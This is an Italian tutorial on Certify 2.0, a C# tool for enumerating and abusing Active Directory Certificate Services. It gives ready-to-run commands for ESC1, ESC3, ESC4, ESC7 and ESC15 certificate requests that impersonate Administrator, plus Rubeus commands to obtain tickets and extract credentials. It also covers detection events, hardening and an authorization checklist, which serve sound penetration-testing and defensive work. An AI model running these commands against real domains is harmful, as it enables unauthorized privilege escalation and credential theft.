---
title: 'Certify: Enumerazione e Abuso di AD CS da Windows con C#'
slug: certify
description: Certify è il tool C# di GhostPack per enumerare e sfruttare AD CS da Windows senza dipendenze Python. Scopri come usarlo per trovare template vulnerabili e richiedere certificati per l'escalation a Domain Admin.
image: /certify-ad-cs.webp
draft: false
date: 2026-06-03T00:00:00.000Z
lastmod: 2026-07-13T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - certificate-services
  - certificate-abuse
---

# Certify 2.0: Guida Completa a AD CS Enumeration e Abuse da Windows

**Certify** è il tool C# di GhostPack per enumerare e verificare configurazioni vulnerabili in **Active Directory Certificate Services (AD CS)** direttamente da Windows. La versione 2.0 usa i comandi `enum-cas`, `enum-templates`, `request`, `request-agent`, `request-download`, `manage-ca` e `manage-template`; identifica condizioni legate alle tecniche ESC1–ESC16 e restituisce i certificati in formato **PFX Base64**, utilizzabile direttamente con [Rubeus](https://hackita.it/articoli/rubeus/).

È il complemento Windows-native di [Certipy](https://hackita.it/articoli/certipy/): Certify è ideale quando hai una sessione Windows nel dominio e vuoi analizzare AD CS senza installare Python, mentre Certipy rimane più comodo da Linux e per workflow come NTLM relay, autenticazione e Shadow Credentials.

***

## Che cos’è Certify e a cosa serve?

**Certify** è uno strumento C# sviluppato da SpecterOps come parte del progetto GhostPack. Interroga Active Directory via LDAP, enumera Certificate Authority e certificate template, evidenzia configurazioni pericolose e può inviare richieste di certificato alla CA.

Per capire il suo ruolo servono quattro concetti:

* **AD CS:** l’infrastruttura PKI di Microsoft usata per emettere e gestire certificati nel dominio.
* **Certificate Authority (CA):** il server che approva, firma ed emette i certificati.
* **Certificate template:** l’oggetto Active Directory che stabilisce chi può richiedere un certificato, per quale identità e con quali utilizzi.
* **PKINIT:** il meccanismo Kerberos che permette di ottenere un TGT usando un certificato invece della password.

Una misconfiguration può quindi trasformare un normale diritto di enrollment in un percorso di privilege escalation: il certificato emesso dalla CA è una credenziale valida e può consentire l’autenticazione come un altro account.

Per la panoramica completa delle tecniche consulta [AD CS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/) e la guida agli [EKU e OID di AD CS](https://hackita.it/articoli/adcs-eku-oid-offensive/).

***

## Certify 1.x e Certify 2.0: non mescolare le sintassi

Molte cheat sheet online mostrano ancora la sintassi del 2021. Certify 2.0 ha rinominato i comandi, separato azioni prima accorpate e aggiunto filtri per ESC più recenti.

| Obiettivo                      | Sintassi legacy 1.x       | Sintassi Certify 2.0                                  |
| ------------------------------ | ------------------------- | ----------------------------------------------------- |
| Enumerare template vulnerabili | `find /vulnerable`        | `enum-templates --filter-enabled --filter-vulnerable` |
| Enumerare le CA                | `cas`                     | `enum-cas`                                            |
| Enumerare oggetti PKI          | `pkiobjects`              | `enum-pkiobjects`                                     |
| Filtrare sul contesto corrente | `/currentuser`            | `--current-user`                                      |
| Mostrare tutte le ACL          | `/showAllPermissions`     | `--show-all-perms`                                    |
| Richiedere SAN/UPN arbitrario  | `request /altname:utente` | `request --upn utente`                                |
| Richiesta on-behalf-of         | `request /onbehalfof:...` | `request-agent --target ...`                          |
| Scaricare una richiesta emessa | `download /id:42`         | `request-download --id 42`                            |
| Output PEM                     | predefinito               | opzionale con `--output-pem`                          |
| Output PFX Base64              | conversione manuale       | predefinito                                           |

> **Nota importante:** i parametri legacy `/username` e `/password` presenti in alcune guide non fanno parte della command reference ufficiale di Certify 2.0. `--target-user` serve a classificare le vulnerabilità rispetto ai gruppi di un altro account, ma **non autentica Certify come quell’utente**.

***

## Requisiti e compilazione

SpecterOps non pubblica binari ufficiali. Il repository va compilato dal sorgente con Visual Studio.

```powershell
git clone https://github.com/GhostPack/Certify
cd Certify

# Apri Certify.sln con Visual Studio 2022
# Configuration: Release
# Build Solution
```

Il progetto è compilato per **.NET Framework 4.7.2**. Prima dell’esecuzione verifica:

```powershell
# Contesto utente
whoami
whoami /groups

# Dominio e controller individuato dalla sessione
$env:USERDNSDOMAIN
nltest /dsgetdc:$env:USERDNSDOMAIN

# Connettività LDAP e RPC Endpoint Mapper
Test-NetConnection dc01.corp.local -Port 389
Test-NetConnection ca01.corp.local -Port 135
```

L’enumerazione normalmente non richiede privilegi amministrativi: è sufficiente un account di dominio che possa leggere gli oggetti PKI. Le richieste e le operazioni di gestione dipendono invece dai diritti di enrollment, dalle ACL dei template e dai ruoli delegati sulla CA.

***

## Cheat sheet Certify 2.0

| Obiettivo                                  | Comando                                                                                                                      |
| ------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------- |
| Enumerare tutte le CA                      | `.\Certify.exe enum-cas`                                                                                                     |
| Mostrare solo CA vulnerabili               | `.\Certify.exe enum-cas --filter-vulnerable --hide-admins`                                                                   |
| Analizzare una CA specifica                | `.\Certify.exe enum-cas --ca "CA01.corp.local\CORP-CA"`                                                                      |
| Enumerare tutti i template                 | `.\Certify.exe enum-templates`                                                                                               |
| Solo template pubblicati                   | `.\Certify.exe enum-templates --filter-enabled`                                                                              |
| Template pubblicati e vulnerabili          | `.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins`                                            |
| Vulnerabilità rispetto all’utente corrente | `.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --current-user`                                           |
| Vulnerabilità rispetto a un utente target  | `.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --target-user mario.rossi`                                |
| Solo template con autenticazione client    | `.\Certify.exe enum-templates --filter-enabled --filter-client-auth`                                                         |
| Template con subject controllabile         | `.\Certify.exe enum-templates --filter-enabled --filter-supply-subject`                                                      |
| Template usabili da Enrollment Agent       | `.\Certify.exe enum-templates --filter-enabled --filter-request-agent`                                                       |
| Dettagli di un template                    | `.\Certify.exe enum-templates --template VulnTemplate --show-all-perms`                                                      |
| Enumerare oggetti PKI e issuance policy    | `.\Certify.exe enum-pkiobjects --show-linked-oids`                                                                           |
| Specificare DC LDAP                        | `.\Certify.exe enum-templates --ldap-server DC01.corp.local`                                                                 |
| Salvare l’output                           | `.\Certify.exe enum-templates --filter-vulnerable --out-file certify.txt`                                                    |
| Richiedere un certificato                  | `.\Certify.exe request --ca "CA01.corp.local\CORP-CA" --template User`                                                       |
| Richiesta ESC1 con UPN e SID               | `.\Certify.exe request --ca "CA01.corp.local\CORP-CA" --template VulnTemplate --upn Administrator --sid <SID>`               |
| Richiesta on-behalf-of                     | `.\Certify.exe request-agent --ca "CA01.corp.local\CORP-CA" --template User --target Administrator --agent-pfx <BASE64_PFX>` |
| Scaricare un certificato emesso            | `.\Certify.exe request-download --ca "CA01.corp.local\CORP-CA" --id 42 --private-key <BASE64_KEY>`                           |
| Mostrare l’help completo                   | `.\Certify.exe <comando> --help`                                                                                             |

***

## Workflow di enumerazione AD CS

### 1. Individuare Certificate Authority e servizi esposti

```powershell
.\Certify.exe enum-cas --hide-admins
```

Per ridurre l’output alle CA che Certify classifica come vulnerabili:

```powershell
.\Certify.exe enum-cas --filter-vulnerable --hide-admins
```

Campi da leggere con attenzione:

* `FullName`: formato richiesto da `--ca`, ad esempio `CA01.corp.local\CORP-CA`.
* `User Specifies SAN`: indica la configurazione CA collegata a ESC6.
* `RPC Request Encryption`: rilevante per ESC11.
* `Disabled Extensions`: può rivelare ESC16.
* `CA Permissions`: cerca `ManageCA`, `ManageCertificates` o enrollment concessi a gruppi troppo ampi.
* `Enrollment Agent Restrictions`: assenza o configurazione debole aumenta il rischio ESC3.

Per una CA specifica:

```powershell
.\Certify.exe enum-cas --ca "CA01.corp.local\CORP-CA" --show-all-perms
```

***

### 2. Cercare template pubblicati e vulnerabili

Il comando più importante per il triage iniziale è:

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --hide-admins
```

`--filter-enabled` è fondamentale: senza questo filtro Certify 2.0 mostra anche template presenti in Active Directory ma non pubblicati da alcuna CA, quindi non richiedibili in quel momento.

Per classificare i risultati in base ai gruppi effettivi dell’account corrente:

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --current-user `
  --hide-admins
```

Per valutare un account compromesso senza cambiare il contesto di esecuzione:

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --target-user svc_backup `
  --hide-admins
```

`--target-user` modifica soltanto il calcolo delle permission e delle vulnerabilità mostrate: non usa le credenziali dell’account indicato.

***

### 3. Filtri mirati per ridurre il rumore

```powershell
# Template che permettono autenticazione via certificato
.\Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Template che consentono al richiedente di specificare il subject/SAN
.\Certify.exe enum-templates --filter-enabled --filter-supply-subject --hide-admins

# Intersezione utile per individuare condizioni simili a ESC1
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-client-auth `
  --filter-supply-subject `
  --hide-admins

# Template utilizzabili per richieste firmate da Enrollment Agent
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-request-agent `
  --hide-admins

# Template che richiedono Manager Approval
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-manager-approval
```

Per l’analisi completa di un singolo template:

```powershell
.\Certify.exe enum-templates `
  --template VulnTemplate `
  --show-all-perms
```

***

### 4. Enumerare PKI object e issuance policy

ESC13 e altre catene dipendono da Enterprise OID collegati a gruppi del dominio. Certify 2.0 include un comando dedicato:

```powershell
.\Certify.exe enum-pkiobjects --show-linked-oids
```

Controlla soprattutto:

* Enterprise OID collegati a gruppi privilegiati;
* ACL modificabili da utenti non privilegiati;
* oggetti PKI con `WriteProperty`, `WriteDacl`, `WriteOwner` o ownership anomala.

Approfondimento: [ESC13 tramite Issuance Policy OID](https://hackita.it/articoli/esc13-adcs/).

***

## Come leggere l’output di un template

Non fermarti alla riga `Vulnerabilities`. Verifica manualmente i campi che compongono il percorso di attacco.

| Campo                            | Perché conta                                                                            |
| -------------------------------- | --------------------------------------------------------------------------------------- |
| `Enabled`                        | Il template è pubblicato e richiedibile                                                 |
| `Publishing CAs`                 | Indica quale CA usare con `--ca`                                                        |
| `Schema Version`                 | Rilevante per Enrollment Agent ed ESC15                                                 |
| `Certificate Name Flag`          | Cerca `ENROLLEE_SUPPLIES_SUBJECT`                                                       |
| `Enrollment Flag`                | Cerca `NO_SECURITY_EXTENSION` per ESC9                                                  |
| `Manager Approval Required`      | Se `True`, la richiesta non viene emessa automaticamente                                |
| `Authorized Signatures Required` | Valori maggiori di zero possono bloccare enrollment diretto                             |
| `Extended Key Usage`             | Determina se il certificato può autenticare, firmare codice o agire da Enrollment Agent |
| `Required Application Policies`  | Vincola le richieste on-behalf-of                                                       |
| `Enrollment Rights`              | Stabilisce chi può richiedere il template                                               |
| `Object Control Permissions`     | Rileva ESC4 e template modificabili                                                     |
| `Validity/Renewal Period`        | Determina durata e possibilità di rinnovo della credenziale                             |

Gli EKU più importanti per l’autenticazione sono:

```text
Client Authentication          1.3.6.1.5.5.7.3.2
PKINIT Client Authentication   1.3.6.1.5.2.3.4
Smart Card Logon               1.3.6.1.4.1.311.20.2.2
Any Purpose                    2.5.29.37.0
Subordinate CA                 nessun EKU
Certificate Request Agent      1.3.6.1.4.1.311.20.2.1
```

***

## ESC1 con Certify 2.0

ESC1 richiede generalmente:

1. diritto di enrollment sulla CA;
2. diritto di enrollment sul template;
3. Manager Approval disabilitato;
4. nessuna firma autorizzata richiesta;
5. EKU valido per l’autenticazione;
6. possibilità per il richiedente di specificare subject o SAN.

### Enumeration

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --current-user `
  --hide-admins
```

### Richiesta del certificato

Negli ambienti moderni non basta sempre indicare soltanto l’UPN. La **Strong Certificate Mapping** introdotta da Microsoft verifica il SID associato al certificato; dopo gli aggiornamenti del 2025 gli ambienti aggiornati devono essere considerati in full enforcement.

```powershell
# Recupera il SID del target in un test autorizzato
Get-ADUser Administrator -Properties objectSid |
  Select-Object SamAccountName, objectSid

# Richiesta ESC1 con UPN e SID
.\Certify.exe request `
  --ca "CA01.corp.local\CORP-CA" `
  --template VulnTemplate `
  --upn Administrator `
  --sid S-1-5-21-111111111-222222222-333333333-500
```

Certify 2.0 restituisce un blocco `Certificate (PFX)` codificato Base64. Non è necessario passare da OpenSSL, salvo richiesta esplicita di output legacy con `--output-pem`.

Approfondimento: [ESC1 AD CS](https://hackita.it/articoli/esc1-adcs/).

***

## ESC3: Enrollment Agent e richiesta on-behalf-of

ESC3 sfrutta un template con EKU **Certificate Request Agent**. Il flusso prevede due certificati distinti.

### 1. Trovare e richiedere l’Enrollment Agent certificate

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --hide-admins

.\Certify.exe request `
  --ca "CA01.corp.local\CORP-CA" `
  --template EnrollmentAgentTemplate
```

Salva il PFX Base64 prodotto dal comando.

### 2. Trovare un template accettabile per on-behalf-of

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-request-agent `
  --hide-admins
```

### 3. Richiedere il certificato per il target

```powershell
.\Certify.exe request-agent `
  --ca "CA01.corp.local\CORP-CA" `
  --template User `
  --target "CORP\Administrator" `
  --agent-pfx <BASE64_PFX_AGENT>
```

Se il PFX dell’Enrollment Agent è protetto da password, aggiungi:

```powershell
--agent-pass 'PasswordPFX'
```

Approfondimento sugli EKU: [AD CS EKU e OID](https://hackita.it/articoli/adcs-eku-oid-offensive/).

***

## ESC4 e ESC7: ACL di template e CA

### ESC4 — Template modificabile

ESC4 esiste quando un principal non privilegiato possiede diritti come:

* `Owner` o `Full Control`;
* `WriteProperty`;
* `WriteOwner`;
* `WriteDacl`.

Enumeration:

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --show-all-perms
```

Certify 2.0 include `manage-template` per gestire impostazioni e ACL durante test controllati:

```powershell
# Mostra le opzioni disponibili prima di modificare qualsiasi oggetto
.\Certify.exe manage-template --help

# Esempi di parametri supportati:
# --supply-subject
# --client-auth
# --manager-approval
# --authorized-signatures
# --enroll <SID>
# --write-dacl <SID>
```

Le modifiche ai template devono essere concordate prima del test, documentate e ripristinate subito dopo la prova. Per un workflow completo e reversibile consulta [ESC4 AD CS Template Hijacking](https://hackita.it/articoli/esc4-adcs/).

### ESC7 — Ruoli delegati sulla CA

```powershell
.\Certify.exe enum-cas `
  --filter-vulnerable `
  --hide-admins
```

Cerca soprattutto:

* `ManageCA`;
* `ManageCertificates`;
* owner o ACL anomale sulla CA.

Certify 2.0 può gestire template pubblicati, ruoli e richieste pending tramite `manage-ca`. Esempio di verifica e download di una richiesta già autorizzata nel test:

```powershell
# Help completo
.\Certify.exe manage-ca --help

# Emissione di una richiesta tramite Request ID
.\Certify.exe manage-ca `
  --ca "CA01.corp.local\CORP-CA" `
  --issue-id 42

# Download con la private key prodotta dalla richiesta originale
.\Certify.exe request-download `
  --ca "CA01.corp.local\CORP-CA" `
  --id 42 `
  --private-key <BASE64_PRIVATE_KEY>
```

Approfondimento: [ESC7 Manage CA](https://hackita.it/articoli/esc7-adcs/).

***

## ESC6, ESC9, ESC15 ed ESC16 nel 2026

La Strong Certificate Mapping ha cambiato l’efficacia di alcune tecniche. Non trattare più ogni SAN arbitrario come escalation automatica.

* **ESC6:** il flag CA `EDITF_ATTRIBUTESUBJECTALTNAME2` consente SAN arbitrari, ma da solo non è normalmente sufficiente in un dominio aggiornato perché la CA inserisce il SID del richiedente.
* **ESC9:** il template ha `NO_SECURITY_EXTENSION` e omette il SID security extension.
* **ESC16:** la CA disabilita globalmente l’estensione SID `1.3.6.1.4.1.311.25.2`.
* **ESC15 / EKUwu:** interessa template schema v1 vulnerabili a injection di application policy; Microsoft ha corretto CVE-2024-49019 nel novembre 2024.

Enumeration:

```powershell
# CA vulnerabili: ESC6, ESC7, ESC11, ESC16 e altre condizioni
.\Certify.exe enum-cas --filter-vulnerable --hide-admins

# Template vulnerabili: ESC1-4, ESC9, ESC13, ESC15 e altre condizioni
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --hide-admins
```

Per ESC15 in un laboratorio non aggiornato, Certify 2.0 supporta `--application-policy`:

```powershell
.\Certify.exe request `
  --ca "CA01.corp.local\CORP-CA" `
  --template WebServer `
  --upn Administrator `
  --sid S-1-5-21-111111111-222222222-333333333-500 `
  --application-policy 1.3.6.1.5.5.7.3.2
```

Approfondimenti:

* [ESC6 AD CS](https://hackita.it/articoli/esc6-adcs/)
* [ESC9 AD CS](https://hackita.it/articoli/esc9-adcs/)
* [ESC16 AD CS](https://hackita.it/articoli/esc16-adcs/)

***

## Usare il PFX Base64 con Rubeus

Certify 2.0 stampa il certificato in un formato direttamente accettato da Rubeus.

```powershell
Rubeus.exe asktgt `
  /user:Administrator `
  /domain:corp.local `
  /dc:DC01.corp.local `
  /certificate:<BASE64_PFX> `
  /enctype:aes256 `
  /ptt `
  /nowrap
```

Per verificare la possibilità di estrarre le credential data tramite U2U nel contesto autorizzato:

```powershell
Rubeus.exe asktgt `
  /user:Administrator `
  /domain:corp.local `
  /dc:DC01.corp.local `
  /certificate:<BASE64_PFX> `
  /enctype:aes256 `
  /getcredentials `
  /show `
  /nowrap
```

Controlla i ticket della sessione:

```powershell
klist
```

Da qui il percorso dipende dai privilegi dell’identità ottenuta. Le guide correlate sono [Rubeus](https://hackita.it/articoli/rubeus/), [DCSync](https://hackita.it/articoli/dcsync/) e [Golden Ticket](https://hackita.it/articoli/golden-ticket/).

***

## Output PEM e conversione manuale: solo per compatibilità

L’output predefinito di Certify 2.0 è PFX Base64. Usa `--output-pem` soltanto se un tool successivo richiede il formato legacy.

```powershell
.\Certify.exe request `
  --ca "CA01.corp.local\CORP-CA" `
  --template User `
  --output-pem
```

Conversione PEM → PFX:

```bash
openssl pkcs12 \
  -in cert.pem \
  -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export \
  -out cert.pfx
```

Con password:

```bash
openssl pkcs12 \
  -in cert.pem \
  -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export \
  -out cert.pfx \
  -passout pass:'PasswordPFX'
```

***

## Certify vs Certipy: quale usare?

| Funzione                  | Certify 2.0                               | Certipy                   |
| ------------------------- | ----------------------------------------- | ------------------------- |
| Linguaggio                | C#                                        | Python                    |
| Ambiente ideale           | Sessione Windows                          | Linux o Windows           |
| Enumerazione CA/template  | Sì                                        | Sì                        |
| Individuazione ESC1–ESC16 | Sì, in base alle funzionalità documentate | Sì                        |
| Richiesta certificati     | Sì                                        | Sì                        |
| Output PFX                | Base64 a console                          | File `.pfx`               |
| PKINIT/auth integrata     | No, usa Rubeus                            | Sì, `certipy auth`        |
| NTLM relay ESC8/ESC11     | Non è un relay tool                       | Sì                        |
| Modifica template/CA      | `manage-template`, `manage-ca`            | Sì, con workflow dedicati |
| Renewal e forge           | Sì in Certify 2.0                         | Sì                        |
| Shadow Credentials        | No                                        | Sì                        |
| Dipendenze                | .NET Framework                            | Python/pip                |

**Usa Certify quando:**

* hai già una shell Windows nel dominio;
* vuoi enumerazione e richieste certificate-native senza Python;
* vuoi PFX Base64 direttamente utilizzabile con Rubeus;
* devi analizzare ACL e configurazioni PKI dal contesto Windows corrente.

**Usa Certipy quando:**

* operi da Kali/Linux;
* devi eseguire relay verso endpoint HTTP o RPC;
* vuoi un unico tool per `find`, `req`, `auth`, `relay`, `shadow` e `forge`.

***

## Detection: come rilevare Certify e l’abuso di AD CS

La detection efficace non deve dipendere soltanto dal nome `Certify.exe`. Il segnale più affidabile è la correlazione tra:

1. enumeration o modifica degli oggetti PKI;
2. richiesta ed emissione del certificato;
3. autenticazione Kerberos tramite certificato;
4. identità, template o SAN incompatibili con il comportamento normale.

### Abilitare l’auditing sulla CA

In una configurazione difensiva, abilita la subcategory **Audit Certification Services** per Success e Failure, quindi configura l’audit filter della CA:

```powershell
certutil -setreg CA\AuditFilter 127
Restart-Service certsvc
```

Raccogli almeno i Security Event Log della CA e dei Domain Controller nel SIEM.

### Event ID principali

| Event ID | Sistema | Significato                                 | Cosa cercare                                       |
| -------- | ------- | ------------------------------------------- | -------------------------------------------------- |
| `4882`   | CA      | Permessi di Certificate Services modificati | Nuovi `ManageCA` o `ManageCertificates`            |
| `4885`   | CA      | Audit filter della CA modificato            | Disattivazione o riduzione dell’auditing           |
| `4886`   | CA      | Richiesta di certificato ricevuta           | Template, requester e attributi insoliti           |
| `4887`   | CA      | Certificato approvato ed emesso             | Certificato auth per account privilegiato          |
| `4888`   | CA      | Richiesta negata                            | Errori ripetuti o test su template non autorizzati |
| `4889`   | CA      | Richiesta impostata pending                 | Richieste poi forzate con ruolo Officer            |
| `4890`   | CA      | Impostazioni Certificate Manager cambiate   | Modifica dei manager/restrizioni                   |
| `4891`   | CA      | Configurazione CA modificata                | Cambio policy, flag o moduli                       |
| `4898`   | CA      | Template caricato                           | Nuovo template pubblicato o ricaricato             |
| `4899`   | CA      | Template aggiornato                         | Modifica EKU, flag o requisiti                     |
| `4900`   | CA      | Sicurezza template aggiornata               | ACL template cambiate                              |
| `5136`   | DC      | Oggetto AD modificato                       | Cambi sugli oggetti Certificate Templates          |
| `4768`   | DC      | Richiesta TGT Kerberos                      | Certificate Issuer/Serial/Thumbprint valorizzati   |

`5136` richiede una SACL adeguata sugli oggetti da monitorare. Per i certificate template controlla modifiche a:

```text
pKIExtendedKeyUsage
msPKI-Certificate-Name-Flag
msPKI-Enrollment-Flag
msPKI-RA-Signature
msPKI-Certificate-Application-Policy
nTSecurityDescriptor
```

### Triage rapido con PowerShell

```powershell
# Eventi AD CS sulla CA
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id      = 4882,4885,4886,4887,4888,4889,4890,4891,4898,4899,4900
} | Select-Object TimeCreated, Id, MachineName, Message

# PKINIT/certificate authentication sui DC
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id      = 4768
} | Where-Object {
  $_.Message -match 'Certificate Thumbprint:\s+\S'
} | Select-Object TimeCreated, MachineName, Message
```

### Correlazioni ad alta priorità

Genera un alert quando:

* un account standard richiede un certificato il cui subject, SAN o UPN indica un account privilegiato;
* un template con Client Authentication viene usato da un principal che normalmente non lo richiede;
* un evento `4899`, `4900` o `5136` è seguito entro pochi minuti da `4886/4887`;
* `ManageCA` o `ManageCertificates` vengono assegnati e subito dopo una richiesta pending viene emessa;
* un `4887` è seguito da un `4768` con certificate thumbprint/serial riconducibile allo stesso certificato;
* vengono emessi certificati con validità anomala, Any Purpose, Subordinate CA o Certificate Request Agent;
* un endpoint utente genera un volume insolito di query LDAP verso `CN=Public Key Services,CN=Services,CN=Configuration`.

> **Limite importante:** `4886` e `4887` da soli possono essere molto rumorosi. La detection deve usare una baseline dei template, dei richiedenti abituali e delle identità autorizzate.

***

## Hardening e mitigazioni

* Rimuovi `Enroll` e `Autoenroll` da `Authenticated Users`, `Domain Users` ed `Everyone` quando non strettamente necessario.
* Abilita Manager Approval o authorized signatures sui template sensibili.
* Elimina `ENROLLEE_SUPPLIES_SUBJECT` dai template con EKU di autenticazione se non richiesto.
* Rimuovi `Any Purpose`, Subordinate CA e Certificate Request Agent dai template accessibili a gruppi ampi.
* Proteggi ACL e ownership dei template; tratta `WriteProperty`, `WriteDacl`, `WriteOwner` e `GenericAll` come privilegi Tier 0.
* Limita `ManageCA` e `ManageCertificates` a gruppi dedicati e monitorati.
* Mantieni i Domain Controller aggiornati e non indebolire Strong Certificate Mapping.
* Verifica che l’estensione SID `1.3.6.1.4.1.311.25.2` non sia disabilitata su template o CA.
* Per Web Enrollment e CES/CEP usa HTTPS, Extended Protection for Authentication e restrizioni NTLM.
* Abilita CA auditing, Directory Service Changes e centralizza gli eventi nel SIEM.
* Esegui audit periodici con Certify, Certipy, PSPKIAudit e Microsoft Defender for Identity.

Microsoft Defender for Identity include security posture assessment specifici per ESC1, ESC3, ESC4, ESC7 ed endpoint AD CS esposti.

***

## Troubleshooting

### Certify non trova nessuna CA

Verifica dominio, DNS e LDAP:

```powershell
nltest /dsgetdc:corp.local
Resolve-DnsName _ldap._tcp.dc._msdcs.corp.local
Test-NetConnection DC01.corp.local -Port 389

.\Certify.exe enum-cas `
  --domain corp.local `
  --ldap-server DC01.corp.local
```

### Il template esiste ma non appare con `--filter-enabled`

Il template è presente in Active Directory ma non è pubblicato da nessuna CA. Rimuovi temporaneamente il filtro per confermare:

```powershell
.\Certify.exe enum-templates --template NomeTemplate
```

Controlla il campo `Enabled` e `Publishing CAs`.

### `--filter-vulnerable` non mostra un template atteso

Il filtro predefinito classifica le vulnerabilità rispetto a gruppi built-in a basso privilegio. Prova il contesto reale:

```powershell
.\Certify.exe enum-templates `
  --filter-enabled `
  --filter-vulnerable `
  --current-user `
  --show-all-perms
```

### La richiesta resta pending

Salva:

* `Request ID`;
* private key Base64 prodotta dalla richiesta;
* nome della CA;
* template usato.

Dopo l’approvazione autorizzata:

```powershell
.\Certify.exe request-download `
  --ca "CA01.corp.local\CORP-CA" `
  --id 42 `
  --private-key <BASE64_PRIVATE_KEY>
```

### Rubeus non autentica con il certificato

Controlla:

* UPN e SID presenti nel certificato;
* EKU di autenticazione;
* trust della CA in `NTAuthCertificates`;
* supporto PKINIT sul DC;
* DNS e sincronizzazione oraria;
* Strong Certificate Mapping;
* revoca e validità del certificato.

```powershell
w32tm /query /status
klist purge
certutil -dump cert.pfx
```

***

## FAQ

### Certify 2.0 supporta ESC1–ESC16?

Certify 2.0 enumera template, CA e oggetti PKI necessari a identificare le condizioni delle tecniche ESC1–ESC16 e include funzionalità per richieste, gestione di template/CA, renewal e forge. Non sostituisce però tutti gli strumenti della catena: per NTLM relay ESC8/ESC11 serve un relay tool, mentre per l’autenticazione PKINIT si usa normalmente Rubeus.

### Certify richiede privilegi amministrativi?

No per la normale enumerazione LDAP. Un utente di dominio può spesso leggere CA, template e ACL. Le richieste di certificato richiedono diritti di enrollment; `manage-template`, `manage-ca` e operazioni equivalenti richiedono ACL o ruoli specifici.

### Certify funziona da una macchina non joinata al dominio?

Certify usa il security context Windows corrente e la command reference 2.0 non offre parametri generici `--username/--password` per l’autenticazione LDAP e CA. Da un host non joinato sono necessari un contesto di dominio valido, DNS corretto e connettività verso LDAP e RPC; in pratica è più affidabile eseguirlo da una sessione Windows già autenticata nel dominio.

### Qual è la differenza tra `--current-user` e `--target-user`?

`--current-user` valuta enrollment e ACL rispetto ai gruppi annidati dell’utente che sta eseguendo Certify. `--target-user` calcola la vulnerabilità rispetto ai gruppi di un altro account, ma non cambia l’identità usata per le richieste.

### Perché non devo più convertire sempre PEM in PFX?

Certify 2.0 restituisce per impostazione predefinita un PFX codificato Base64, direttamente accettato da Rubeus. `--output-pem` mantiene il vecchio comportamento solo per compatibilità.

### ESC6 è ancora sufficiente per ottenere Domain Admin?

In un ambiente aggiornato con Strong Certificate Mapping, generalmente no. La CA inserisce il SID del richiedente, quindi il SAN arbitrario non basta. ESC6 può tornare sfruttabile in combinazione con ESC9, ESC16 o weak mapping specifici.

### Quali campi devo controllare per confermare ESC1?

`Enabled: True`, CA e template enrollment rights per il principal, Manager Approval disabilitato, zero authorized signatures, EKU valido per authentication e `ENROLLEE_SUPPLIES_SUBJECT`.

### Certify può fare NTLM relay?

No: enumera la configurazione rilevante per ESC8/ESC11, ma non è un listener/relay framework. Per il relay si usano strumenti come Certipy o ntlmrelayx in un test autorizzato.

### Quali eventi indicano un possibile abuso AD CS?

I segnali principali sono `4886/4887` per richiesta ed emissione, `4768` con certificate information per PKINIT, `4899/4900` e `5136` per modifiche ai template, `4882/4890/4891` per cambi di ruoli e configurazione della CA.

***

## Checklist operativa

```text
PREPARAZIONE
[ ] Confermato scope e autorizzazione per richieste/modifiche AD CS
[ ] Identificati dominio, DC e CA
[ ] Verificata connettività LDAP e RPC
[ ] Compilata la versione corrente di Certify dal repository ufficiale

ENUMERAZIONE
[ ] enum-cas --filter-vulnerable --hide-admins
[ ] enum-templates --filter-enabled --filter-vulnerable --current-user
[ ] enum-templates --show-all-perms sui template sospetti
[ ] enum-pkiobjects --show-linked-oids
[ ] Verificati EKU, SAN, SID extension, approval, signatures e ACL

VALIDAZIONE
[ ] Confermato che il template è pubblicato
[ ] Confermati enrollment rights su CA e template
[ ] Valutata Strong Certificate Mapping
[ ] Salvati Request ID, private key e PFX
[ ] Testato il certificato soltanto entro lo scope autorizzato

DETECTION
[ ] Audit Certification Services abilitato
[ ] CA AuditFilter configurato
[ ] Eventi 4882, 4885-4891, 4898-4900 raccolti
[ ] Eventi 4768 e 5136 raccolti sui DC
[ ] Correlazione emissione certificato → PKINIT configurata nel SIEM

RIPRISTINO
[ ] Ripristinate eventuali modifiche a template e CA
[ ] Revocati i certificati emessi per il test
[ ] Pubblicata CRL aggiornata se necessario
[ ] Conservate evidenze e Request ID nel report
```

***

## Conclusione

Certify 2.0 non è più soltanto il vecchio `find /vulnerable`. È un toolkit Windows-native per analizzare l’intera superficie AD CS: CA, template, ACL, issuance policy, Strong Certificate Mapping, richieste on-behalf-of e gestione controllata degli oggetti PKI.

Il workflow corretto è:

1. `enum-cas` per capire quali CA esistono e come sono configurate;
2. `enum-templates` per isolare template pubblicati, vulnerabili e realmente utilizzabili dal principal;
3. verifica manuale di EKU, SAN, SID extension, approval, firme e ACL;
4. `request` o `request-agent` soltanto dopo aver confermato i prerequisiti;
5. autenticazione con [Rubeus](https://hackita.it/articoli/rubeus/) e correlazione difensiva tra `4887` e `4768`;
6. ripristino, revoca e documentazione delle modifiche eseguite durante il test.

Per i workflow Linux, relay e autenticazione integrata continua con [Certipy](https://hackita.it/articoli/certipy/). Per l’intero attack surface consulta [AD CS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Risorse

* [GhostPack Certify — repository ufficiale](https://github.com/GhostPack/Certify)
